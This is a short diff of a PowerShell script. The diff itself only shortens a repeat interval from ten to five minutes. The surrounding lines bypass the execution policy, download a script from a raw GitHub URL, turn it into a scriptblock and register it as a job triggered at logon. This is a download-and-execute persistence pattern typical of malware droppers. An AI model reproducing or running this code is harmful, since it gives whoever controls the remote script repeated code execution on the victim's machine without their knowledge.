@@ -4,7 +4,7 @@ Set-ExecutionPolicy ByPass
 $url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/basic.ps1"
 $run = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
 $script = $run
-$repeat = (New-TimeSpan -Minutes 10)
+$repeat = (New-TimeSpan -Minutes 5)
 $scriptblock = [scriptblock]::Create($script)
 $trigger = @(
 	$(New-JobTrigger -AtLogOn),
